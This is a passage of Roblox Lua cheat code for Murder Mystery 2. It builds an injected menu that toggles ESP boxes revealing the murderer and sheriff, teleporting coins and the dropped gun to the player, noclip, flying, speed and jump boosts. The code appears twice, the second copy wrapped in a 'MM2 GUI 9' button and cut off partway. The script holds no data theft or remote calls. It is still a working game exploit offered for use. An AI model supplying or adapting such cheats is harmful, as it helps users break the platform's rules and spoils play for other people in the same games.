    pez.initiated = true;
end

function pez:addTab(name,text)
    if (pez.initiated) then
        local exframe = Instance.new("Frame")
        local exflabel = Instance.new("TextLabel")

        exframe.Active = true;
        exframe.Draggable = true;
        exframe.Name = name
        exframe.Parent = game.CoreGui.nikopez;
        exframe.BackgroundColor3 = Color3.new(1, 0.0941177, 0.0941177)
        exframe.BackgroundTransparency = 0.5
        exframe.BorderSizePixel = 0
        exframe.Position = UDim2.new(0.0218181908 * (tabs*5), 0, 0.0418994427, 0)
        exframe.Size = UDim2.new(0, 170, 0, 25)

        exflabel.Name = "exflabel"
        exflabel.Parent = exframe
        exflabel.BackgroundColor3 = Color3.new(1, 1, 1)
        exflabel.BackgroundTransparency = 1
        exflabel.Position = UDim2.new(0.0352941193, 0, 0, 0)
        exflabel.Size = UDim2.new(0.964705884, 0, 1, 0)
        exflabel.Font = Enum.Font.ArialBold
        exflabel.Text = text
        exflabel.TextColor3 = Color3.new(1, 1, 1)
        exflabel.TextSize = 15
        exflabel.TextStrokeTransparency = 0.40000000596046
        exflabel.TextXAlignment = Enum.TextXAlignment.Left
        tabs = tabs + 1;
    else
        print("pez not initiated!");
    end
end

function pez:addButton(tab,text,func)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local TextButton = Instance.new("TextButton");

        TextButton.Parent = game.CoreGui.nikopez[tab];
        TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
        TextButton.BackgroundTransparency = 1
        TextButton.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        TextButton.Size = UDim2.new(0.964705884, 0, 0, 25)
        TextButton.Font = Enum.Font.ArialBold
        TextButton.Text = "> "..text
        TextButton.TextColor3 = Color3.new(255,255,255)
        TextButton.TextSize = 13
        TextButton.TextStrokeTransparency = 0.40000000596046
        TextButton.TextXAlignment = Enum.TextXAlignment.Left

        TextButton.MouseButton1Click:connect(function()
            TextButton.TextColor3 = Color3.new(0,255,0)
            func();
            wait(0.5)
            TextButton.TextColor3 = Color3.new(255,255,255)
        end)
    else
        print("pez not initiated!");
    end
end

function pez:hide()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    if (v.Name ~= "playerlist") then
                        v.Visible = false;
                    end
                end
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:show()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    v.Visible = true;
                end
            end
        end
    else
        print("pez not initiated!");
    end
end
    
function pez:itemExists(tab,item)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(item)) then
                return true;
            else
                return false;
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:addLabel(tab,name,text)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = Color3.new(255,255,255)
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:addColoredLabel(tab,name,text,color)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = color
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:removeLabel(tab,name)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(name)) then
                game.CoreGui.nikopez[tab]:FindFirstChild(name):Destroy();
                local count = 1;
                for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
                    if (v.Name ~= "exflabel") then
                      v.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25);
                      count = count + 1;
                    end
                end
            end
        else
            print(tab.." not found")
        end
    else
        print("pez not initiated!");
    end
end

function pez:showTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = true;
        end
    else
        print("pez not initiated!");
    end
end

function pez:hideTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = false;
        end
    else
        print("pez not initiated!");
    end
end

function pez:clearTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:ClearAllChildren()
        end
    else
        print("pez not initiated!");
    end
end

function pez:removeTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:Destroy();
        end
    else
        print("pez not initiated!");
    end
end



function makebox(part,color)
    local yoniko = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    yoniko.Name = "yoniko"
    yoniko.Parent = part
    yoniko.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    yoniko.AlwaysOnTop = true
    yoniko.LightInfluence = 1
    yoniko.Size = UDim2.new(4, 0, 6, 0)
    
    Frame.Parent = yoniko
    Frame.BackgroundColor3 = color
    Frame.BackgroundTransparency = 0.5
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function makedot(part)
    local nikohead = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    nikohead.Name = "nikohead"
    nikohead.Parent = part
    nikohead.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    nikohead.AlwaysOnTop = true
    nikohead.LightInfluence = 1
    nikohead.Size = UDim2.new(1, 0, 1, 0)
    
    Frame.Parent = nikohead
    Frame.BackgroundColor3 = Color3.new(0,0,255);
    Frame.BackgroundTransparency = 0.20000000298023
    Frame.BorderColor3 = Color3.new(0, 0, 0)
    Frame.Rotation = 120
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function checkTeam(plr)
    local bp = plr.Backpack
    local char = plr.Character

    local x = false;
    for i,v in pairs(char:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    for i,v in pairs(bp:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    if (bp:FindFirstChild("Knife") or char:FindFirstChild("Knife")) then
        return 1;
    elseif (x) then
        return 2;
    else
        return 3;
    end
end

pez:init();

enableds = {};

espon = false;
fovon = false;

espgun = false;
espmurderer = true;
espsheriff = true;
espinnocent = false;

tpgun = false;
tpcoins = false;

noclip = false;
fly = false;
fast = false;
highjump = false;

hidden = false;

showvisuals = true;
showespsettings = true;
showmovement = true;
showitems = true;
showenableds = true;
showplayerlist = true;

pez:addTab("cheats","Enabled cheats");

function toggleesp()
    espon = not espon;
    if (espon) then
        pez:addLabel("cheats","esp","ESP");
    else
        pez:removeLabel("cheats","esp");
    end
end

function togglefov()
    fovon = not fovon;
    if (fovon) then
        pez:addLabel("cheats","fov","FOV");
    else
        pez:removeLabel("cheats","fov");
    end
end

function toggleespgun()
    espgun = not espgun;
end

function toggleespmurderer()
    espmurderer = not espmurderer;
end

function toggleespsheriff()
    espsheriff = not espsheriff;
end

function toggleespinnocent()
    espinnocent = not espinnocent;
end

function toggletpgun()
    tpgun = not tpgun;
    if (tpgun) then
        pez:addLabel("cheats","tpgun","Tp gun");
    else
        pez:removeLabel("cheats","tpgun");
    end
end

function toggletpcoins()
    tpcoins = not tpcoins;
    if (tpcoins) then
        pez:addLabel("cheats","tpcoins","Tp coins");
    else
        pez:removeLabel("cheats","tpcoins");
    end
end

function togglenoclip()
    noclip = not noclip;
    if (noclip) then
        pez:addLabel("cheats","noclip","Noclip");
    else
        pez:removeLabel("cheats","noclip");
    end
end

function tplobby()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-107,149,23))
end

--FLY SCRIPT BY RGEENEUS

local speed = 50

local c
local h
local bv
local bav
local cam
local flying
local p = game.Players.LocalPlayer
local buttons = {W = false, S = false, A = false, D = false, Moving = false}

local startFly = function () -- Call this function to begin flying 
    if not p.Character or not p.Character.Head or flying then return end
    c = p.Character
    h = c.Humanoid
    h.PlatformStand = true
    cam = workspace:WaitForChild('Camera')
    bv = Instance.new("BodyVelocity")
    bav = Instance.new("BodyAngularVelocity")
    bv.Velocity, bv.MaxForce, bv.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bav.AngularVelocity, bav.MaxTorque, bav.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bv.Parent = c.Head
    bav.Parent = c.Head
    flying = true
    h.Died:connect(function() flying = false end)
end

local endFly = function () -- Call this function to stop flying
    if not p.Character or not flying then return end
    h.PlatformStand = false
    bv:Destroy()
    bav:Destroy()
    flying = false
end

game:GetService("UserInputService").InputBegan:connect(function (input, GPE) 
    if GPE then return end
    for i, e in pairs(buttons) do
        if i ~= "Moving" and input.KeyCode == Enum.KeyCode[i] then
            buttons[i] = true
            buttons.Moving = true
        end
    end
end)

game:GetService("UserInputService").InputEnded:connect(function (input, GPE) 
    if GPE then return end
    local a = false
    for i, e in pairs(buttons) do
        if i ~= "Moving" then
            if input.KeyCode == Enum.KeyCode[i] then
                buttons[i] = false
            end
            if buttons[i] then a = true end
        end
    end
    buttons.Moving = a
end)

local setVec = function (vec)
    return vec * (speed / vec.Magnitude)
end

game:GetService("RunService").Heartbeat:connect(function (step) -- The actual fly function, called every frame
    if flying and c and c.PrimaryPart then
        local p = c.PrimaryPart.Position
        local cf = cam.CFrame
        local ax, ay, az = cf:toEulerAnglesXYZ()
        c:SetPrimaryPartCFrame(CFrame.new(p.x, p.y, p.z) * CFrame.Angles(ax, ay, az))
        if buttons.Moving then
            local t = Vector3.new()
            if buttons.W then t = t + (setVec(cf.lookVector)) end
            if buttons.S then t = t - (setVec(cf.lookVector)) end
            if buttons.A then t = t - (setVec(cf.rightVector)) end
            if buttons.D then t = t + (setVec(cf.rightVector)) end
            c:TranslateBy(t * step)
        end
    end
end)


function togglefly()
    if (fly) then
        fly = false;
        endFly()
        pez:removeLabel("cheats","fly");
    else
        fly = true;
        startFly()
        pez:addLabel("cheats","fly","Fly");
    end
end

function togglefast()
    fast = not fast;
    if (fast) then
        pez:addLabel("cheats","fast","Fast");
    else
        pez:removeLabel("cheats","fast");
    end
end

function togglejump()
    highjump = not highjump;
    if (highjump) then
        pez:addLabel("cheats","highjump","Highjump");
    else
        pez:removeLabel("cheats","highjump");
    end
end

function setday()
    local lighting = game.Lighting
    lighting.TimeOfDay = 12;
end

function setnight()
    local lighting = game.Lighting
    lighting.TimeOfDay = 22;
end

game:service'RunService'.Stepped:connect(function()
    if (noclip) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(11) end
    if (fast) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 24; else game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16; end
    if (highjump) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 120; else game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50; end
end)

function onKeyPress(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.Home then
        if (hidden) then
            print(hidden)
            hidden = false;
            pez:show();
        else
            print(hidden)
            hidden = true;
            pez:hide();
        end
	end
end

function togglevisuals()
    if (showvisuals) then
        showvisuals = false;
        pez:hideTab("visuals");
    else
        showvisuals =true;
        pez:showTab("visuals");
    end
end

function toggleespsettings()
    if (showespsettings) then
        showespsettings = false;
        pez:hideTab("espsettings");
    else
        showespsettings =true;
        pez:showTab("espsettings");
    end
end

function toggleitems()
    if (showitems) then
        showitems = false;
        pez:hideTab("items");
    else
        showitems =true;
        pez:showTab("items");
    end
end

function togglemovement()
    if (showmovement) then
        showmovement = false;
        pez:hideTab("movement");
    else
        showmovement =true;
        pez:showTab("movement");
    end
end

function toggleenableds()
    if (showenableds) then
        showenableds = false;
        pez:hideTab("cheats");
    else
        showenableds =true;
        pez:showTab("cheats");
    end
end

function toggleplayerlist()
    if (showplayerlist) then
        showplayerlist = false;
        pez:hideTab("playerlist");
    else
        showplayerlist =true;
        pez:showTab("playerlist");
    end
end
 
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

pez:addTab("gui","Gui");
pez:addLabel("gui","info","Toggle gui: Home")
pez:addButton("gui","Visuals",togglevisuals)
pez:addButton("gui","Esp settings",toggleespsettings)
pez:addButton("gui","Items",toggleitems)
pez:addButton("gui","Movement",togglemovement)
pez:addButton("gui","Enabled cheats",toggleenableds)
pez:addButton("gui","Playerlist",toggleplayerlist)

pez:addTab("visuals","Visuals");
pez:addButton("visuals","ESP",toggleesp)
pez:addButton("visuals","FOV",togglefov)
pez:addButton("visuals","Set night",setnight)
pez:addButton("visuals","Set day",setday)

pez:addTab("espsettings","Esp settings");
pez:addButton("espsettings","Show murderer",toggleespmurderer)
pez:addButton("espsettings","Show sheriff",toggleespsheriff)
pez:addButton("espsettings","Show innocents",toggleespinnocent)
pez:addButton("espsettings","Show dropped gun",toggleespgun);

pez:addTab("items","Items");
pez:addButton("items","Tp coins",toggletpcoins)
pez:addButton("items","Tp gun",toggletpgun)

pez:addTab("movement","Movement");
pez:addButton("movement","Noclip",togglenoclip)
pez:addButton("movement","Fly",togglefly)
pez:addButton("movement","Fast",togglefast)
pez:addButton("movement","Highjump",togglejump)
pez:addButton("movement","Tp to lobby",tplobby)

pez:addTab("playerlist","Playerlist")

pez:addTab("credits","Credits");
pez:addLabel("credits","nikoo","niko#1809")

print("press Home to toggle the gui");
print("mm2 script by niko#1809 / lekolar2 ;)")

local cor = coroutine.wrap(function()
    while(true) do
        wait(1)
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (pez:itemExists("playerlist",v.Name)) then
                    pez:removeLabel("playerlist",v.Name)
                end

                local team = checkTeam(v);

                if (team == 1) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(255,0,0))
                elseif (team == 2) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,0,255))
                else
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,255,0))
                end
            end
        end
    end
end)

cor();

x = 0;

while(true)do
    if (x == 200) then pez:removeTab("credits"); else x = x + 1; end
    wait();
    if (fovon) then
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 100;
    else
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 70;
    end
    if (tpcoins) then
        for i,v in pairs(workspace:GetChildren()) do
            if (v:FindFirstChild("CoinContainer")) then
                for w,g in pairs(v.CoinContainer:GetChildren()) do
                    g.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                end
            end
        end
    end
    if (tpgun) then
        if (workspace:FindFirstChild("GunDrop")) then
            workspace.GunDrop.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        end
    end
    if (espon) then
        if (espgun) then
            if (workspace:FindFirstChild("GunDrop")) then
                if (workspace.GunDrop:FindFirstChild("nikohead")) then
                    workspace.GunDrop.nikohead:Destroy()
                end
                makedot(workspace.GunDrop);
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (v.Character:WaitForChild("HumanoidRootPart")) then
                    if (v~=game.Players.LocalPlayer) then
                        if (v.Character:WaitForChild("HumanoidRootPart"):FindFirstChild("yoniko")) then
                            v.Character:WaitForChild("HumanoidRootPart").yoniko:Destroy()
                        end
                        local team = checkTeam(v)

                        if (team == 1) then
                            if (espmurderer) then makebox(v.Character.HumanoidRootPart,Color3.new(255,0,0)); end
                        elseif (team == 2) then
                            if (espsheriff) then makebox(v.Character.HumanoidRootPart,Color3.new(0,0,255)); end
                        else
                            if (espinnocent) then makebox(v.Character.HumanoidRootPart,Color3.new(0,255,0)); end
                        end
                    end
                end
            end
        end
    end
end
end)

Section:NewButton("MM2 GUI 9", "Idk what to say lol", function()
--murder mystery 2 script by niko#1809
--have fun :>

local pez = {};

pez.initiated = false;

local tabs = 0;

function pez:init()
    local nikopez = Instance.new("ScreenGui")
    local exframe = Instance.new("Frame")

    nikopez.Name = "nikopez"
    nikopez.Parent = game.CoreGui
    nikopez.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    pez.initiated = true;
end

function pez:addTab(name,text)
    if (pez.initiated) then
        local exframe = Instance.new("Frame")
        local exflabel = Instance.new("TextLabel")

        exframe.Active = true;
        exframe.Draggable = true;
        exframe.Name = name
        exframe.Parent = game.CoreGui.nikopez;
        exframe.BackgroundColor3 = Color3.new(1, 0.0941177, 0.0941177)
        exframe.BackgroundTransparency = 0.5
        exframe.BorderSizePixel = 0
        exframe.Position = UDim2.new(0.0218181908 * (tabs*5), 0, 0.0418994427, 0)
        exframe.Size = UDim2.new(0, 170, 0, 25)

        exflabel.Name = "exflabel"
        exflabel.Parent = exframe
        exflabel.BackgroundColor3 = Color3.new(1, 1, 1)
        exflabel.BackgroundTransparency = 1
        exflabel.Position = UDim2.new(0.0352941193, 0, 0, 0)
        exflabel.Size = UDim2.new(0.964705884, 0, 1, 0)
        exflabel.Font = Enum.Font.ArialBold
        exflabel.Text = text
        exflabel.TextColor3 = Color3.new(1, 1, 1)
        exflabel.TextSize = 15
        exflabel.TextStrokeTransparency = 0.40000000596046
        exflabel.TextXAlignment = Enum.TextXAlignment.Left
        tabs = tabs + 1;
    else
        print("pez not initiated!");
    end
end

function pez:addButton(tab,text,func)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local TextButton = Instance.new("TextButton");

        TextButton.Parent = game.CoreGui.nikopez[tab];
        TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
        TextButton.BackgroundTransparency = 1
        TextButton.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        TextButton.Size = UDim2.new(0.964705884, 0, 0, 25)
        TextButton.Font = Enum.Font.ArialBold
        TextButton.Text = "> "..text
        TextButton.TextColor3 = Color3.new(255,255,255)
        TextButton.TextSize = 13
        TextButton.TextStrokeTransparency = 0.40000000596046
        TextButton.TextXAlignment = Enum.TextXAlignment.Left

        TextButton.MouseButton1Click:connect(function()
            TextButton.TextColor3 = Color3.new(0,255,0)
            func();
            wait(0.5)
            TextButton.TextColor3 = Color3.new(255,255,255)
        end)
    else
        print("pez not initiated!");
    end
end

function pez:hide()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    if (v.Name ~= "playerlist") then
                        v.Visible = false;
                    end
                end
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:show()
    if (pez.initiated) then
        for i,v in pairs(game.CoreGui.nikopez:GetChildren()) do
            if (v:IsA("Frame")) then
                if (v.Name ~= "cheats") then
                    v.Visible = true;
                end
            end
        end
    else
        print("pez not initiated!");
    end
end
    
function pez:itemExists(tab,item)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(item)) then
                return true;
            else
                return false;
            end
        end
    else
        print("pez not initiated!");
    end
end

function pez:addLabel(tab,name,text)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = Color3.new(255,255,255)
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:addColoredLabel(tab,name,text,color)
    if (pez.initiated) then
        local count = 0;
        for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
            count = count + 1;
        end

        local label = Instance.new("TextLabel");

        label.Name = name;
        label.Parent = game.CoreGui.nikopez[tab];
        label.BackgroundColor3 = Color3.new(1, 1, 1)
        label.BackgroundTransparency = 1
        label.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25)
        label.Size = UDim2.new(0.964705884, 0, 0, 25)
        label.Font = Enum.Font.ArialBold
        label.Text = "> "..text
        label.TextColor3 = color
        label.TextSize = 13
        label.TextStrokeTransparency = 0.40000000596046
        label.TextXAlignment = Enum.TextXAlignment.Left
    else
        print("pez not initiated!");
    end
end

function pez:removeLabel(tab,name)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            if (game.CoreGui.nikopez[tab]:FindFirstChild(name)) then
                game.CoreGui.nikopez[tab]:FindFirstChild(name):Destroy();
                local count = 1;
                for i,v in pairs(game.CoreGui.nikopez[tab]:GetChildren()) do
                    if (v.Name ~= "exflabel") then
                      v.Position = UDim2.new(0.0352941193, 0, 1, (25*count)-25);
                      count = count + 1;
                    end
                end
            end
        else
            print(tab.." not found")
        end
    else
        print("pez not initiated!");
    end
end

function pez:showTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = true;
        end
    else
        print("pez not initiated!");
    end
end

function pez:hideTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab].Visible = false;
        end
    else
        print("pez not initiated!");
    end
end

function pez:clearTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:ClearAllChildren()
        end
    else
        print("pez not initiated!");
    end
end

function pez:removeTab(tab)
    if (pez.initiated) then
        if (game.CoreGui.nikopez:FindFirstChild(tab)) then
            game.CoreGui.nikopez[tab]:Destroy();
        end
    else
        print("pez not initiated!");
    end
end



function makebox(part,color)
    local yoniko = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    yoniko.Name = "yoniko"
    yoniko.Parent = part
    yoniko.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    yoniko.AlwaysOnTop = true
    yoniko.LightInfluence = 1
    yoniko.Size = UDim2.new(4, 0, 6, 0)
    
    Frame.Parent = yoniko
    Frame.BackgroundColor3 = color
    Frame.BackgroundTransparency = 0.5
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function makedot(part)
    local nikohead = Instance.new("BillboardGui")
    local Frame = Instance.new("Frame")
    
    nikohead.Name = "nikohead"
    nikohead.Parent = part
    nikohead.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    nikohead.AlwaysOnTop = true
    nikohead.LightInfluence = 1
    nikohead.Size = UDim2.new(1, 0, 1, 0)
    
    Frame.Parent = nikohead
    Frame.BackgroundColor3 = Color3.new(0,0,255);
    Frame.BackgroundTransparency = 0.20000000298023
    Frame.BorderColor3 = Color3.new(0, 0, 0)
    Frame.Rotation = 120
    Frame.Size = UDim2.new(1, 0, 1, 0)
end

function checkTeam(plr)
    local bp = plr.Backpack
    local char = plr.Character

    local x = false;
    for i,v in pairs(char:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    for i,v in pairs(bp:GetChildren()) do
        if v:FindFirstChild("IsGun") then
            if (v.IsGun.Value == true) then
                x = true;
            end
        end
    end

    if (bp:FindFirstChild("Knife") or char:FindFirstChild("Knife")) then
        return 1;
    elseif (x) then
        return 2;
    else
        return 3;
    end
end

pez:init();

enableds = {};

espon = false;
fovon = false;

espgun = false;
espmurderer = true;
espsheriff = true;
espinnocent = false;

tpgun = false;
tpcoins = false;

noclip = false;
fly = false;
fast = false;
highjump = false;

hidden = false;

showvisuals = true;
showespsettings = true;
showmovement = true;
showitems = true;
showenableds = true;
showplayerlist = true;

pez:addTab("cheats","Enabled cheats");

function toggleesp()
    espon = not espon;
    if (espon) then
        pez:addLabel("cheats","esp","ESP");
    else
        pez:removeLabel("cheats","esp");
    end
end

function togglefov()
    fovon = not fovon;
    if (fovon) then
        pez:addLabel("cheats","fov","FOV");
    else
        pez:removeLabel("cheats","fov");
    end
end

function toggleespgun()
    espgun = not espgun;
end

function toggleespmurderer()
    espmurderer = not espmurderer;
end

function toggleespsheriff()
    espsheriff = not espsheriff;
end

function toggleespinnocent()
    espinnocent = not espinnocent;
end

function toggletpgun()
    tpgun = not tpgun;
    if (tpgun) then
        pez:addLabel("cheats","tpgun","Tp gun");
    else
        pez:removeLabel("cheats","tpgun");
    end
end

function toggletpcoins()
    tpcoins = not tpcoins;
    if (tpcoins) then
        pez:addLabel("cheats","tpcoins","Tp coins");
    else
        pez:removeLabel("cheats","tpcoins");
    end
end

function togglenoclip()
    noclip = not noclip;
    if (noclip) then
        pez:addLabel("cheats","noclip","Noclip");
    else
        pez:removeLabel("cheats","noclip");
    end
end

function tplobby()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-107,149,23))
end

--FLY SCRIPT BY RGEENEUS

local speed = 50

local c
local h
local bv
local bav
local cam
local flying
local p = game.Players.LocalPlayer
local buttons = {W = false, S = false, A = false, D = false, Moving = false}

local startFly = function () -- Call this function to begin flying 
    if not p.Character or not p.Character.Head or flying then return end
    c = p.Character
    h = c.Humanoid
    h.PlatformStand = true
    cam = workspace:WaitForChild('Camera')
    bv = Instance.new("BodyVelocity")
    bav = Instance.new("BodyAngularVelocity")
    bv.Velocity, bv.MaxForce, bv.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bav.AngularVelocity, bav.MaxTorque, bav.P = Vector3.new(0, 0, 0), Vector3.new(10000, 10000, 10000), 1000
    bv.Parent = c.Head
    bav.Parent = c.Head
    flying = true
    h.Died:connect(function() flying = false end)
end

local endFly = function () -- Call this function to stop flying
    if not p.Character or not flying then return end
    h.PlatformStand = false
    bv:Destroy()
    bav:Destroy()
    flying = false
end

game:GetService("UserInputService").InputBegan:connect(function (input, GPE) 
    if GPE then return end
    for i, e in pairs(buttons) do
        if i ~= "Moving" and input.KeyCode == Enum.KeyCode[i] then
            buttons[i] = true
            buttons.Moving = true
        end
    end
end)

game:GetService("UserInputService").InputEnded:connect(function (input, GPE) 
    if GPE then return end
    local a = false
    for i, e in pairs(buttons) do
        if i ~= "Moving" then
            if input.KeyCode == Enum.KeyCode[i] then
                buttons[i] = false
            end
            if buttons[i] then a = true end
        end
    end
    buttons.Moving = a
end)

local setVec = function (vec)
    return vec * (speed / vec.Magnitude)
end

game:GetService("RunService").Heartbeat:connect(function (step) -- The actual fly function, called every frame
    if flying and c and c.PrimaryPart then
        local p = c.PrimaryPart.Position
        local cf = cam.CFrame
        local ax, ay, az = cf:toEulerAnglesXYZ()
        c:SetPrimaryPartCFrame(CFrame.new(p.x, p.y, p.z) * CFrame.Angles(ax, ay, az))
        if buttons.Moving then
            local t = Vector3.new()
            if buttons.W then t = t + (setVec(cf.lookVector)) end
            if buttons.S then t = t - (setVec(cf.lookVector)) end
            if buttons.A then t = t - (setVec(cf.rightVector)) end
            if buttons.D then t = t + (setVec(cf.rightVector)) end
            c:TranslateBy(t * step)
        end
    end
end)


function togglefly()
    if (fly) then
        fly = false;
        endFly()
        pez:removeLabel("cheats","fly");
    else
        fly = true;
        startFly()
        pez:addLabel("cheats","fly","Fly");
    end
end

function togglefast()
    fast = not fast;
    if (fast) then
        pez:addLabel("cheats","fast","Fast");
    else
        pez:removeLabel("cheats","fast");
    end
end

function togglejump()
    highjump = not highjump;
    if (highjump) then
        pez:addLabel("cheats","highjump","Highjump");
    else
        pez:removeLabel("cheats","highjump");
    end
end

function setday()
    local lighting = game.Lighting
    lighting.TimeOfDay = 12;
end

function setnight()
    local lighting = game.Lighting
    lighting.TimeOfDay = 22;
end

game:service'RunService'.Stepped:connect(function()
    if (noclip) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(11) end
    if (fast) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 24; else game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16; end
    if (highjump) then game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 120; else game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50; end
end)

function onKeyPress(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.Home then
        if (hidden) then
            print(hidden)
            hidden = false;
            pez:show();
        else
            print(hidden)
